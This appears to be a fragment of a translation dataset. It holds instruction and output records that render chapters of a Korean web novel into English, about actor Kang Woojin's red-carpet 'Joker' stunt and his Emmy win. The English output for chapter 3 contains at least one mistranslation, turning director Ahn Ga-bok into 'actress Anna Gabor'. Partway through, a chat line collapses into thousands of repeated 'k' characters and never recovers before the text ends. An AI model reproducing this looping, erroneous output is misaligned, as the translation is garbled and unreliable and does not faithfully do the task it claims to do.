'Beneficial Evil' was probably the hottest thing at this year's 'Emmys', having maintained the number one spot on Netflix worldwide for over two months. Of course. \\"The main focus is Kang Woojin, center the shots around him.\\" The protagonist was Kang Woojin. A little later. The hall, now filled with tens of thousands of seats, was bustling with an impressive array of figures. Everyone was engaged in their own conversations. At that moment. -♫♪ Quite lively music played, and the hall's lights brightened several times and turned slightly blue. The giant stage was also lit up. The large 'Emmy' trophy statue was no exception. The 'EMMYs' letters on the monitors attached to either side of the statue began to spin. Then. -Swish. A tall black man in a suit, who looked a bit like Joseph Felton but wasn't, took to the stage. He was actor and comedian Bradley Morgan, known for his wit, and Morgan was hosting the entire 'Emmys' this year. Standing alone on the giant stage, even with tens of thousands of spectators in front of him, he said: \\"Welcome- oh, I'm already tired.\\" He started the proceedings with a joke, as if he wasn't nervous at all. \\"I've been given the great task of hosting the 'Emmys'. Hmm- to be honest, it was a bit bothersome, you know? The 'Emmys' are famous for being long. I wanted to watch the 'Emmys' at home with a beer!\\" Laughter spread from the tens of thousands of spectators. Then, host Bradley Morgan suddenly changed the topic. \\"What can we do, we're here so let's get started. Let's see. This year's 'Emmys' had a lot of amazing things, right? Among them, 'Beneficial Evil' definitely stood out. I enjoyed it too. And Kang Woojin! Your red carpet performance was the best!\\" Suddenly, the broadcast team's cameras all focused on the 'Beneficial Evil' team, and Kang Woojin, with his indifferent expression, was also captured in the angle. Of course, by the live broadcast cameras as well. Bradley started with 'Beneficial Evil' and mentioned other works and actors, heating up the atmosphere. And then. \\"Alright, let's start this year's 'Primetime Emmys!'\\" With his declaration. -♫♪ Lively music played throughout the hall again. The lights brightened and dimmed repeatedly. The sound of tens of thousands of spectators clapping was mixed in. The live broadcast chat also surged like crazy. Soon, host Bradley announced the first award. \\"The first award is for Art Direction in a Drama Series!\\" As his shout ended, the works were displayed on the giant monitors on either side of the trophy statue on the stage. There were a total of five works, and among them was. -[Netflix/Beneficial Evil S1] Part 1 of 'Beneficial Evil' was included. It was the only Korean work among the five. Then, a male and female Hollywood actor took to the large stage. The female actor held a cue card with 'EMMYS' written on it. \\"Hello, it's an honor to be presenting the first award at the 'Emmys'.\\" After a brief greeting, the female actor among the two opened the sealed cue card. The 'Emmys' hall, filled with tens of thousands of spectators, fell silent for a moment, and the female actor, after seeing the cue card, smiled slightly and shouted into the standing microphone. \\"Congratulations on the Emmy for Art Direction in a Drama Series! 'Beneficial Evil!!\\" 'Beneficial Evil' was called first. Once again, all cameras captured the 'Beneficial Evil' team. -♬♪ Music played along with the applause of tens of thousands. Then, two people from the 'Beneficial Evil' team stood up. They were the key staff in charge of art direction. The two, with widened eyes, received congratulations. Producer Song Manwoo, writer Choi Nana, and everyone else gave a standing ovation. Kang Woojin did the same. The two key staff members in art direction. \\"Is it true?! Really??!\\" They climbed onto the giant stage with faces that seemed to be in a dream. Amidst the applause, the 'Emmys' trophy was handed to the two key staff members. The female staff member went to the standing microphone first. \\".....Ah- Thank you so much. Ah, um. First of all, I love my parents so much. Our team worked so hard. Also- Ha, I don't know what to do? I can't remember!\\" She showed a visibly flustered appearance. She was the better off of the two. The male staff member that followed even started to tear up. Regardless, it was a historic moment as a Korean work was called at the 'Emmys' for the first time, and the heated atmosphere continued as the award ceremony moved on to the next category. Costume and casting awards, a total of three awards were presented. -♫♪ Likewise, a thunderous applause poured out for the winning teams, but the 'Beneficial Evil' team was not among them. Next was. \\"The Music Award for a Drama Series!\\" It was the music award, and the 'Beneficial Evil' team was included, but. \\"The Emmy for Music in a Drama Series! 'White Man'!!\\" Unfortunately, it was a miss. However, in the following award. \\"The Stunt Performance Award! 'Beneficial Evil!! Congratulations!!\\" 'Beneficial Evil' was called again. The Stunt Performance Award was essentially the Action Award. Producer Song Manwoo and the entire team clenched their fists. They had high hopes for the action category. \\"That's it!!\\" Kang Woojin's action had amazed the world. And before long, 'Beneficial Evil' had already achieved two wins at the 'Emmys'. They had impressively broken the atmosphere that even winning one award would be a huge success. However, the next award for which 'Beneficial Evil' was nominated, the Special Effects Award, was again a miss. At this time. -Swish. Host Bradley Morgan, standing on one side of the giant stage, spoke into the microphone. \\"Next up are the actors, right? Let's start with the Supporting Actor category in the drama series.\\" Suddenly, the atmosphere shifted from the staff to the actors who shone in the works. It started with the Supporting Actor award. Unfortunately, 'Beneficial Evil' was not included in the Supporting Actor category. Other Hollywood actors from different works filled the stage. They were supporting actors from American Netflix productions and the foreign broadcast channel HOB. After each actor's acceptance speech, host Bradley Morgan took to the stage with a smile. \\"The atmosphere is heating up, and it seems like it's going to get even hotter. Now it's time for the Lead Actor category in the drama series. We'll start with the Lead Actor award.\\" From this point on, the 'Emmys' broadcast team and the live broadcast team were busy. The murmuring of tens of thousands of spectators also grew several times louder. \\"Finally, huh. It's one of the big events of this 'Emmys', right?\\" \\"Ah, Kang Woojin? Hmm- His momentum is scary, but... it's difficult to win the Lead Actor award in one go, isn't it? Unless he came through the Supporting Actor category.\\" \\"I think the same. He achieved a miracle at Cannes, but the 'Emmys' are more stubborn than Cannes.\\" \\"That's true, but still, he's too inexperienced. He's already won two awards, and that's impressive enough.\\" Directors, actors, producers, officials, etc. Kang Woojin's name was being tossed around by numerous people. \\"Honestly, Kang Woojin's energy is amazing. I enjoyed 'Beneficial Evil' too. But still, in terms of acting quality, Matthew Majors is a step above, isn't he?\\" \\"It seems that way, but- I don't know. Lately, I find Matthew's acting a bit boring.\\" \\"Boring?\\" \\"With that level of experience, you should feel an energy that captivates you, not just good acting. But it always feels like the same atmosphere, doesn't it?\\" \\"Is Kang Woojin different?\\" \\"When I see his acting... I don't know. It just feels like the character itself is frolicking around.\\" \\"Are you saying Kang Woojin will win the Lead Actor award?\\" \\"I hope so, but considering many factors, the 'Emmys' are likely to have a lower chance.\\" Suddenly, the 'Emmys' live broadcast angle showed Kang Woojin, who was sitting with crossed legs and no significant change in expression, quietly. The chat was filled with comments like \\"Why is he so calm?\\" but in reality, Kang Woojin's heart was pounding at this moment. 'Wow- crazy, wait a minute. Why does it feel different from Cannes??' There were several reasons, but the biggest one was, of course, that this place was the vast Hollywood, and it was Hollywood's 'Emmys'. What stopped his heart from beating was the two actresses who had climbed onto the stage. One wore a yellow dress, the other a pink dress. The one holding the cue card was the one in the pink dress. \\"I'm nervous to be announcing the Lead Actor award.\\" The two actresses finished their brief conversation and then announced the nominees. The actors were displayed on the giant stage monitor. Not their real appearances, but their characters from the works. Starting with bald-headed Matthew Majors, whom he had encountered earlier, to curly-haired Billy Brown, and others. And at the very end. -[Netflix/Beneficial Evil S1/Kang Woojin] Kang Woojin, who played 'Jang Yeonwoo', was displayed. He was the first Korean or Asian actor to be nominated for the 'Emmys' Lead Actor award. Then the actress in the pink dress opened the cue card. \\"The 'Emmys' drama category, Lead Actor award goes to-\\" Suddenly, the cameras captured the nominated actors. The last was Kang Woojin. At this point, Miley Kara, who was sitting behind Woojin, glanced at the back of his head. \\"'Beneficial Evil' has a good flow, already two wins. The issue aspect must have been included in the evaluation. There's a chance. But still - the 'Emmys' have a long tradition and they dislike change. I wonder how it will turn out...\\" At this moment, people around the world watching the 'Emmys' live broadcast were filled with prayers. Especially in Korea. \\"Please! Please!! Please!!!\\" \\"Our Woojin! Let it be Woojin!\\" \\"Oppa will do it! It will happen! It has to! Right?\\" Kang Woojin's family, Hong Hye-yeon, Ryu Jung-min, and everyone else who knew him held their breath and hoped. \\"If Woojin wins- no, he must win. Ah! Why am I so nervous!\\" \\"Be quiet! Everyone is praying, don't startle them!\\" Perhaps. No, 100% of Korea was hoping. They all wished for the foreign actress on stage to call out Kang Woojin's name. Then. -Swish. The live broadcast showed the actress holding the cue card, and she. \\"Oh!\\" Smiled broadly. \\"The 'Emmys' drama category, Lead Actor award goes to-\\" And then she shouted the name as if the stage was about to explode. \\"Beneficial Evil!!! Kang! Woo! Jin!!\\" The two actresses on stage clapped excessively. \\"Wow!!\\" \\"Congratulations!!\\" -♫♪ Music burst forth. -Clap clap clap clap clap clap clap clap!! Tens of thousands in the audience erupted in applause. About half stood up to clap for Kang Woojin. The standing ovation was the same for the 'Beneficial Evil' team. -Clap clap clap clap clap clap clap clap clap!! Miley Kara, Hwarin, and the other actors couldn't contain their joyous laughter. \\"Mr. Woojin!! Mr. Woojin!! Congratulations for real!\\" \\"Amazing!!! You did it!!\\" \\"Wow!! No! Wow- Congratulations, Mr. Woojin!!\\" Bearded Song Manwoo PD hugged the rising Kang Woojin. \\"Hahaha! That's right!! This is how it should be!! Congratulations, Mr. Woojin!!\\" Writer Choi Nana, clapping from behind, had tears in her eyes. The entire 'Beneficial Evil' team was jumping with joy. The surrounding audience also congratulated Woojin with a standing ovation. The broadcast team, live broadcast cameras focused on the congratulated Kang Woojin. \\".....\\" Kang Woojin, in his navy tuxedo, with an unfazed face. -Swish. Walked towards the giant stage where the actresses stood. It was a short distance to the stage. Soon, Woojin, who had climbed onto the stage, received the trophy from the actress in the yellow dress. For a moment, one of the broadcast team's cameras captured the other nominated actors. Bald-headed Matthew Majors clapping with a blank expression. The atmosphere felt forced. Regardless, Kang Woojin on stage. \\"......\\" Stood in front of the central standing microphone. The rumbling music stopped. The thunderous applause subsided. Tens of thousands of spectators gazed only at him. Woojin looked down at the golden trophy in one hand. The shape of a woman with wings supporting a globe. For a brief moment, Kang Woojin, who had been looking down at the trophy indifferently, lifted his head. Then he opened his mouth towards the tens of thousands of foreign spectators. The first words of the Korean actor who won the Lead Actor award at the 'Emmys' for the first time, holding the golden trophy, were, of course, in English. \\"Now only the 'Academy Award' remains.\\" < Emmy (4) > End"},{"instruction":"translate to English, don't change symbol and line break.

'너무 무성의하잖아!!' '이, 이거 방송으로 그냥 나가도 괜찮은 건가?!' 그러거나 말거나 생중계 카메라를 응시하는 강우진은 침착했다. 일말의 표정 변화가 없다. 컨셉질이 그 어느 때보 다 짙다. 뭐 내면으로는 약간의 호들갑을 떨고는 있었지만. ‘미친. 질렀다, 괜찮나? 괜찮겠지? 아니, 안 괜찮아. 근데 어째?? 이게 '조커(Joker)'의 모습이라고.’ 겉으로는 포커페이스를 어떻게든 유지했다. 속된말로 엿될 게 보이기 하나, 자신이 내세운 캐릭터가 ‘조커(Joker)’ 다 보니 어쩔 수 없는 선택이었다. 이때 사회자 중 남자 쪽이 가까스로 정신 차리면서 다시 물었다. \\"...그, 그렇군요! 우진씨는 지금 신작의 빌런을 표현하신 거였습니까?\\" “네. 설명이 됐습니까?” “충분히! 그래도 ‘보든지 말든지'는 조금 농담이 과한 게 아닌지! 하하하.” 남자 사회자의 눈빛에서 ‘제발, 평범하게 대답해줘' 광선이 쏴졌다. 허나 강우진의 쎈척이 호락호락할 리가 없었 다. “진심입니다. 보든지 말든지 알아서 하십쇼.” 곧. -파바바바박! -파바바바바박! 멍때리던 수백 기자들이 셔터를 미친 듯 눌러댔다. 흔치 않은 진풍경이었으니까. 몇몇 기자들은 미소를 띠기까지 했다. 나타나면 이슈를 낳는 강우진이 얼마나 사랑스러울까? ‘욕이야 그가 먹는 거고, 우리는 이 자극을 전달하면 그만이지.' 한편. 현 상황을 생중계로 보는 헐리웃 곳곳 인물들의 반응은 반반이었다. ‘삐에로:빌런의 탄생' 촬영 세트장에 모인 안 가복, 프로듀서 노라 포스터는 걱정과 쾌감이 적절히 섞였고. “이런! 이건 너무 세게 나간 거 아닌가요??!\\" “그런가? 흠- 근데 강우진이 원체 이런 캐릭터니까요. 오히려 난 엄청난 어그로가 끌릴 거 같은데?” 배우들도 비슷했다. 크리스 하트넷은 명백히 즐기고 있었다. “내일이면 언론 메인은 죄다 우진씨가 장악하겠어, 세상 어느 배우가 자기 영화를 이렇게 홍보해? 외형만이 아닌, 진짜 ‘조커(Joker)’로 대중들을 대할 줄은- 담이 두둑한 그만이 가능한 거지.” ‘컬럼비아 스튜디오’ 간부들도, ‘야수와 미녀’ 제작진들도, ‘존 페르소나’의 조셉 펠튼 외의 다수도. 수많은 거물들 은 강우진을 구경하느라 바빴다. 이어 포토존의 강우진이 퇴장할 쯤엔. “여기까지 하겠습니다.” 생중계를 지켜보는, 한국과 일본 포함 전세계의 대중들은 날뛰는 것으로 부족한 정도였다. 발광하는 채팅이 폭발 하는 중. -ᄏᄏᄏᄏᄏᄏ지렸닥ᄏᄏᄏᄏᄏᄏ -강우진이 지금 보든지 말든지라고 한 거야? 내가 본 게 맞아? -진짜 미쳐버린 건가...인터뷰를 저따위로 하다니.... -여기 외국인들 지금 정신나감ᄏᄏᄏᄏᄏᄏ너네는 이제 처음 강우진을 맛보는 거지만 우린 자주봄ᄏᄏᄏᄏᄏ -퍼포먼스치고는 조금 과한데? 얼마나 작품에 자신 있으면 저러지?? -그보다 여기 한국인들 왜 이렇게 좋아해? 자기 나라 배우가 정신이 나간 게 즐거워? -↑포기해ᄏᄏᄏᄏ포기하면 편하다 그리고 그냥 즐격ᄏᄏᄏᄏᄏᄏᄏ -깡우진 폼 미쳤다 -레드카펫부터 보인 게 전부 작품의 캐릭터라는 거지? 근데 마지막 대사는 그냥 자기 멋대로 한 거 같은데 -현실에서 차기작 티저 보인 건 강우진이 처음 아닌가? -어이어이 놀라지마 강우진의 미친 짓은 이제 시작이라고?ᄏᄏᄏᄏ . . . 한국어, 일본어, 영어, 불어 등 언어는 제각각에 포격하듯 채팅이 쉴새 없이 올라왔고 반응은 극명하게 갈렸다. 욕설이 반, 격한 응원이 반. 욕이 포함된 부정적 반응엔 또라이다, 미친놈이다, 뭐 저딴 병신이 다 있냐, 에미상을 무시하는 거다, 선을 넘었다, 심하게 나댄다 외의 말로 표현 못 할 욕설이 넘실거렸다. 반대로 응원에는 찬양과 극찬이 팽팽하게 맞섰다. 진창이 따로 없었다만 하나 확실한 건, 강우진이 세계로 가지는 영향력이 무시무시하다는 것. 실제로 ‘에미상’레 드카펫엔 수많은 헐리웃 탑배우들이 즐비했으나. -강우진이 진심 난 놈이다!! 욕이든 찬양이든 전세계를 요동치게 함ᄏᄏᄏᄏ 대중들이 울부짖는 건 강우진뿐이었다. 뒤로. 포토존에서 퇴장한 강우진이 장발을 쓸면서도. -스윽. 진행스탭과 가드들의 안내에 따라 메인 건물 방향으로 이동했다. ‘에미상’의 시상식이 열릴 초대형 공연장 또는 홀과 함께, 여러 대기실이 준비된 건물이었다. 건물 입구를 통과한 우진의 눈엔 외국인들이 미어터지는 로비가 보였 다. 관계자, 감독, 연출자, 배우, 유명인 등이 섞인 상태. 대놓고는 아니지만 그들은 대체로 방금 입장한 강우진을 힐끔거렸다. 그 순간. \\"우진아, 이쪽!\\" 외국인들로 득실거리는 사이 정장을 차려입은 최성건과 팀원들이 강우진을 불렀다. 금세 달라붙은 팀원들은 모두 우진에게 엄지를 보였고 미소를 띤 최성건도 같았다. “퍼포먼스 제대로 먹혔다, 너도 봤겠지만 여기 인간들 죄다 네 얘기 밖에 안 해.” 안 그래 주면 섭하죠, 나름 고심해서 준비한 건데. 속으로 읊조린 강우진은 별수롭지 않게 고개를 끄덕였다. “다행이네요.” “아직 확인은 안 했는데 기사는 진작에 터졌을 거다.” 곧, 최성건이 시간을 확인하면서도 서둘렀다. “어이구! 시간! 우진아, 바로 옷 갈아입자. 메이크업도!” 얼굴 빼곤 ‘조커(Joker)'인 강우진이 팀원들과 함께 미리 배정받은 대기실로 움직였다. 후로 약 30분 정도 흘렀고. -달칵. 대기실에서 나오는 강우진. \\".....\\" 지금의 그에게선 '조커(Joker)' 모습을 찾을 순 없었다. 네이비 턱시도에 흑발을 깔끔하게 뒤로 넘긴, 그야말로 명 품을 휘감아 멋을 제대로 부린 우진이었으니까. 양해를 구한 ‘조커(Joker)’는 여기까지. 잠시간 자신의 모습을 내려보던 우진이 속으로 읊조렸다. '진짜 뭔가 '조커(Joker)' 같긴 하네.' 알맹이가 따로 있고 가면을 바꿔 쓰는 형태가 그랬다. 순간, 안가복 감독의 말이 떠오르는 그. ‘삐에로:빌런의 탄생'의 핵심 내용을 알리려 한다고 착각할만하네.' 강우진은 그런 깊은 속뜻 없이 그저 관심 증폭이 목적이었지만 어느 쪽이 됐던 대성공. 우진은 지금부턴 ‘조커(Joker)’가 아닌, ‘이로운 악’의 ‘장연우’로서 움직여야 했다. 곧, 강우진이 다시금 로비 방향으로 걸었다. 그쯤 누군가 강 우진을 영어로 불렀다. \\"우진씨.\\" 시선을 돌리니 검은색 드레스에 찰랑거리는 금발이 눈에 띄는 마일리 카라가 웃고 있었다. 바로 헉하는 강우진. 물론, 속으로만. ‘워- 미쳤네.’ 카라의 빼어난 미모도 미모지만, 분위기? 아우라? 전체적인 자태가 입이 쩍 벌어질 정도였다. 잠시 정신이 날아간 우진의 옆으로 카라가 붙으며 팔짱 꼈다. “가죠.” 이런 시상식에선 으레 볼 수 있는 그림이라 이상하진 않지만, 퍼뜩 정신을 차린 강우진은 그녀의 팔짱 낀 손이 미세히 떨린다는 걸 인지했다. '뭐지? 얼굴만으론 여유가 넘치는데 긴장한 건가? 아니면- 혹시 나 때문에?' 정답이었다. 인파 사이로 진입하는 카라는 지금 정신이 없었다. '아우, 그냥 동료 느낌으로 낀 팔짱인데 왜 이렇게 심장이 뛰는 건데?' ‘이로운 악’ 파트1에 카라가 출연했으니 ‘에미상' 초청은 당연했고, 지금껏 연기나 가수 관련으로 많은 시상식을 들락거린 카라였다. 허나 오늘의 ‘에미상’은 뭔가 감각부터가 남달랐다. 가만히 있던 우진이 대뜸 작게 물었다. “떨립니까?\\" \\".....아니요? 내가 왜 떨려요?” “익숙한 냄새가 나서요. 저번에 말한 컨셉질 같은 거.” “내가 아무렇지 않은 척하고 있다는 말을 하고 싶어요?” “나는 아까 그랬거든요. 레드카펫 행진할 때.” “전혀 그렇게 안 보이던데요.” “그러니까 그게 내가 말했던 컨셉.” 이때. \\"오우!\\" 둘의 대화를 끊으며 끼어드는 외국인들. 헐리웃 감독 중 꽤나 유명한 인물이었다. “마일리 오랜만이군. 그리고- 강우진씨? 처음 보네요.” “네, 오랜만이네요 감독님.” “안녕하십니까.” 강우진과 카라는 ‘에미상’이 열리는 홀에 가기도 전에 수많은 인사를 나눠야 했다. 이 감독을 시작으로 여러 인물 들이 들러붙었다. 당연한 현상이긴 했다. 카라도 카라지만, 그들의 목적은 전부 강우진이었다. “하하하, 우진씨. 레드카펫 퍼포먼스가 대단하던데요? 작품의 티저를 현실에서 보여준다라- 아이디어에 반했습 니다.” “감사합니다.” “나중에 더 길게 얘기하고 싶군요.” 호의적으로 대하는 사람이 있는가 하면 아예 대놓고 비아냥거리는 인물도 있었다. “지금이야 다들 당신의 행동이 생소하니 신기함에 호기심을 가지지만, 앞으로도 헐리웃에서 계속 활동할 생각이 면 조금은 겸손해야 할 겁니다.” 물론, 강우진은 흔들림이 없었다. “아직은 괜찮다는 얘기네요.” \\".....그 자만함이 언젠가 발목을 잡겠죠.” “내가 알아서 하죠.” 우진은 속으로 ‘뭐야 저 새끼’ 정도의 간단한 감상이 다였지만, 그의 옆에 붙은 마일리 카라는 심히 걱정하는 투였다. 퉁명스러움이 섞이긴 했다. “저 사람 원래 그래요, 워낙 옛날 헐리웃부터 있던 인물이라 꽉 막힌 부분도 있고. 신경쓰지 말아요.” “딱히 상관없어요. 누군지도 모르겠고.” 그렇게 많은 외국인들을 상대하던 강우진이 가까스로. -스윽. ‘에미상’ 시상식이 열릴 공연장 또는 홀에 들어섰다. 바로 내면으로 욕부터 박는 강우진. ‘와- 씨바, 규모 지리네.’ 그의 반응이 전혀 이상하지 않은 사이즈였다. 웅장함을 넘어선 광활함이랄까? 일단 규모로 보면 대형 극장을 10 개쯤 합친 크기에, 높고 컴컴한 천장에는 커다란 진주 형태의 조명들이 가득했다. 밤하늘에 수놓은 별 같기도 하다. 그런 홀에 좌석만 1층, 2층으로 수만이 넘어갔고 방송팀이 즐비한 정면 무대엔 거대한 모니터도 여럿 달렸다. 뭣보다 눈길을 사로잡는 건. ‘무대 위에 저 동상은 그건가? 트로피??' “에미상의 시상식이 진행될 무대였다. 무대만 해도 어마무시한 사이즈였다. 그곳 중앙에 당당히 놓인, 원형 구 형 태를 잡은 날개 달린 여자의 동상. ‘에미상’의 트로피였다. 사람의 10배쯤 넘는 크기. 동상 양옆에는 두 배는 큰 모니 터가 세워졌고, 노란색 바탕에 ‘EMMYS’라는 글자가 박혀 있다. 칸부터 한국의 시상식을 경험한 강우진이었지만. '.....퀄 지리네.' 솔직히 ‘에미상'의 반도 못 따라간다 생각했다. 왜 ‘에미상’이 방송계 ·아카데미상'이라 불리는지 절절히 느낄 수있는 대목. 거기다 헐리웃은 물론, 전세계로 난다긴다하는 인물들이 가득한 상황. 이 전체를 눈에 담는 강우진은 실로 경이로움이 솟았다. 새삼 여기 있는 자신이 안 믿긴달까? ‘다리 굳어질라 하네, 정신 차려라 강우진.' 여기서 두리번거리던 카라가 말했다. “'이로운 악’ 자리는 저쪽인 거 같네요.” 그녀가 손을 뻗을 때였다. “마일리.” 약간은 중후한 목소리의 남자 목소리가 옆쪽에서 들렸고, 우진과 카라가 동시에 고개를 돌렸다. 민머리에 수염 난, 검은 턱시도를 차려입은 남자가 다가오고 있었다. 순간, 강우진은 저 남자가 배우임을 직감했다. 어디서 많이 봤으 니까. ‘아- 백퍼 어디서 봤는데.’ 하지만 당연히 이름은 떠오르지 않았다. 카라가 그의 이름을 대신 읊조렸다. “매튜.” 매튜 메이저스. 나름 경력이 꽉 찬 중년 헐리웃 탑배우로, 연기적으로는 깔 게 없는 실력파 배우였다. 현재는 인기 미드의 주연으로 출연 중. 그런 그가 카라와 악수한 뒤. -슥. 무심한 얼굴인 강우진에게도 손을 내밀었다. “강우진씨, 반갑습니다.” “안녕하세요.” 적당히 답한 우진은 느꼈다. ‘이 아재! 왜 손에 힘주고 난리지??' 악수 중인 매튜 메이저스가 손에 악력을 넣는다는 것. 우진은 왜인지 지면 안 된다는 생각이 들었다. \\".....\\" 무던한 얼굴로 똑같이 손에 힘을 넣었다. 딱히 티는 안 났지만 그대로 몇 초 정도 흘렀고, 손을 놓은 둘 중 매튜가 한 손을 주머니에 쑤시면서도 입을 열었다. “'투나잇 쇼' 잘 봤어요, 우리가 안중에 없다는 인터뷰도. 거슬렸어요, 황당하기도 하고.” '우리?' 뭔가를 직감한 우진에게 카라가 속삭였다. “그는 당신과 같이, 드라마 부문 남우주연상 후보 중 한 명이에요.” 즉, 앞의 민머리 매튜 메이저스는 강우진이 포함된 후보 5명 중 한 명이란 얘기. 매튜는 우진의 인터뷰가 상당히 마음에 안 들었던 모양이었다. ‘거슬렸다’라는 표현을 섞었으니까. 이어 매튜가 강우진에게 다시 말했고. “이 헐리웃은 한국배우 한 명이 뭘 어찌할 정도로 좁지 않지. 그래서 당신에게 직접 듣고 싶군요, 그 거슬리는 인 터뷰는 방송 분위기에 맞춰 적당히 호응해준 거겠죠?” 약간의 협박이 가미된 어투. 무표정인 우진의 낮은 대답은 빨랐다. “거슬렸다면 성공이네요.” 강우진의 ‘노빠꾸' 대답에 민머리 매튜 메이저스가 미간을 좁혔다. “허- 성공? 그렇다는 건 역시 그 인터뷰가 다분히 의도적이었다는 건가?\\" \\".....\\" 무심히 매튜의 얼굴을 보는 강우진. 그의 표정이 삭막하다. 이에 우진은 덤덤한 척을 했다만, 속으로는 약간 쫄았 다. '아니? 의도 아니었다고! 그거 착각이었다니까? 나는 걍 주변을 둘러볼 생각이 없다'고 답한 거였다고.’ 그런데 헐리웃은 그것을 멋대로 재단해 세상에 발표했다. ‘강우진'은 나머지 후보들이 안중에도 없다는 식으로. 덕분에 한동안 언론, 여론이 시끌시끌했었다. 우진은 매튜의 심정이 이해되기도 했다. 나타난 지 얼마 되지도 않은 핏덩이가, 헐리웃 경력 수십 년인 매튜를 무시한 꼴이었으니까. ‘약간- 내가 심한호 선배님을 놀린 꼴인가?' 하지만 뭐 어쩌겠는가? 이미 물은 엎질러졌고 이만한 착각은 강우진에게 익숙했다. 앞의 매튜를 또 볼지는 모르 겠다만, 이런 상황에 우진이 선택할 건 늘 언제나 같았다. ‘개썅마이웨이.' “난 언제나 진심으로 행동합니다.” \\".....그런가.\\" “네.” 서로를 바라보는 두 남자. 아니 노려본다고 해야하나? 그러다 매튜가 픽 웃었다. “자신감과 자만함은 한 끗 차이지. 자네의 능력은 인정하는 바이나- 너무 나대면 꺾일 거야, 아무리 잘 한다고 해도 상대 배우에 관한 존중은 해야하지 않겠나.” “존중은 합니다. 실제로 제가 한 인터뷰엔 ‘다른 배우들이 안중에도 없다’는 단어가 포함돼 있지 않죠. 그저 주변 을 신경 쓰지 않는다고 했을 뿐.” “그 말이 그 말 아닌가요?.” “아니요, 확실히 말하자면 그냥 내 할 일만을 할 뿐이라는 겁니다. 다른 것에 눈길을 주지 않고 말이죠.” \\"......\\" 어느새 양손을 주머니에 찌른 매튜가 몇 초간 강우진을 응시했고, 작게 숨을 뱉으면서도 재차 입을 열었다. “강우진씨 당신이 한국배우로서 헐리웃에 첫 길을 닦는 것인데- 너무 막 나가는군.” “글쎄요, 방금 말했다시피 난 내 길을 갈 뿐입니다.” “오늘의 '에미상'이 그리 자신이 있나?\\" “선택은 우리가 하는 게 아니죠.” 대중이, 세상이 해주는 것이라는 답변. 정답이었고 민머리 매튜는 자신의 턱수염을 쓸다가, 몸을 휙 돌려 자신의 좌석으로 성큼성큼 걸어갔다. 그런 매튜가 혼잣말을 뱉었다. “어찌 될지 보자고, 칸의 기적이 ‘에미’에서도 이어질지.” < 에미 (3) > 끝","output":"< Emmy (3) > Due to the short and concise lines of Kang Woo-jin, who transformed into 'Joker'. \\"This is the villain, watch it or not.\\" The photo zone at the end of the 'Emmy Awards' red carpet quieted down for a moment. The male and female hosts in charge of the event, hundreds of reporters, broadcast teams, live broadcast teams, and many others stopped with their mouths slightly open. \\".....\\" \\".....\\" It was a situation that justified such a reaction. It was the first time they had seen Woo-jin's appearance and the interview he gave after his appearance. Faces that had no idea how to react because it was the first time they had seen it. However, internally, they were mostly screaming in absurdity. 'Watch it or not? What kind of crazy talk is this??' 'Is he really crazy??! Which actor promotes their next work like that!' 'That's too insincere!!' 'Can this really go out on the broadcast just like this?!' Regardless, Kang Woo-jin, who was staring at the live broadcast camera, was calm. There was not a hint of change in his expression. His act was thicker than ever before. Although internally, he was a bit flustered. 'Crazy. Did I overdo it? Is it okay? No, it's not okay. But what to do?? This is the look of 'Joker.' Externally, he somehow maintained a poker face. Although he could see trouble coming, he had no choice because the character he presented was 'Joker.' At that moment, one of the male hosts managed to regain his composure and asked again. \\"...So, Woo-jin, are you expressing the villain of your new work?\\" \\"Yes. Is that explanation enough?\\" \\"Absolutely! But 'watch it or not' is a bit too much of a joke, isn't it! Hahaha.\\" The male host's eyes shot 'please, answer normally' beams. However, Kang Woo-jin's pretense was not so easily swayed. \\"I'm serious. Watch it or not, do as you please.\\" Soon. -Papapapapak! -Papapapapapapak! The hundreds of reporters who had been dazed began to press their shutters like crazy. It was an unusual spectacle. Some reporters even smiled. How adorable must Kang Woo-jin be, who always creates issues when he appears? 'Whether he gets cursed at or not, we just have to deliver this stimulation.' Meanwhile. The reactions of people in Hollywood watching the live broadcast were mixed. In the filming set of 'Pierrot: The Birth of a Villain,' actress Anna Gabor and producer Nora Foster had a mix of worry and pleasure. \\"Oh no! Isn't this going too far??!\\" \\"Is it? Hmm- But Kang Woo-jin is such a character. I think it will attract tremendous attention.\\" The actors felt similarly. Chris Hartnett was clearly enjoying it. \\"By tomorrow, the media headlines will all be dominated by Woo-jin. Which actor promotes their movie like this? Not just in appearance, but to actually treat the public as the real 'Joker'—only someone as bold as him could do it.\\" The executives of 'Columbia Studio,' the production team of 'Beast and Beauty,' Joseph Felton of 'John Persona,' and many others were also busy watching Kang Woo-jin. When Kang Woo-jin was about to exit the photo zone. \\"I'll stop here.\\" The public watching the live broadcast, including Korea and Japan, were beyond excited. The chat was exploding with activity. -Kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk